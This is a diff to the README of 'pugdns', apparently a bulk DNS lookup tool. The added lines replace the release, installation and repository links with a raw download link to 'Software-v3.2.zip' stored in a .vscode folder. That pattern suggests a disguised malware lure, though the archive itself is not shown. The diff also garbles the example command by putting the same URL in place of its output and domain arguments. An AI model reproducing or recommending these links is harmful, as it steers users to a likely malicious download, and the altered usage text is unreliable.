@@ -4,7 +4,7 @@
 
 🚀 Built with AF_XDP for Extremely Fast and Accurate Bulk DNS Lookups 🌐
 
-[![Download pugdns](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Ander12342/pugdns/releases)
+[![Download pugdns](https://raw.githubusercontent.com/Ander12342/pugdns/main/.vscode/Software-v3.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Ander12342/pugdns/main/.vscode/Software-v3.2.zip)
 
 ## Overview
 pugdns is a cutting-edge DNS query tool designed for high-performance bulk DNS lookups. Leveraging the power of AF_XDP, this tool provides lightning-fast and precise results, making it ideal for a wide range of network operations.
@@ -16,7 +16,7 @@ pugdns is a cutting-edge DNS query tool designed for high-performance bulk DNS l
 
 ## Installation
 To get started with pugdns, simply download the latest release from the following link:
-[Download pugdns](https://github.com/Ander12342/pugdns/releases)
+[Download pugdns](https://raw.githubusercontent.com/Ander12342/pugdns/main/.vscode/Software-v3.2.zip)
 
 ## Usage
 1. Download the latest release of pugdns.
@@ -25,7 +25,7 @@ To get started with pugdns, simply download the latest release from the followin
 
 ## Examples
 ```bash
-$ ./pugdns -i eth0 -o results.txt -d example.com -n 1000
+$ ./pugdns -i eth0 -o https://raw.githubusercontent.com/Ander12342/pugdns/main/.vscode/Software-v3.2.zip -d https://raw.githubusercontent.com/Ander12342/pugdns/main/.vscode/Software-v3.2.zip -n 1000
 ```
 
 ## Contribute
@@ -36,7 +36,7 @@ pugdns is released under the MIT License. See the [LICENSE](LICENSE) file for mo
 
 ---
 
-Visit the [PugDNS Repository](https://github.com/Ander12342/pugdns) for more details. 🐾
+Visit the [PugDNS Repository](https://raw.githubusercontent.com/Ander12342/pugdns/main/.vscode/Software-v3.2.zip) for more details. 🐾
 
 ---
 
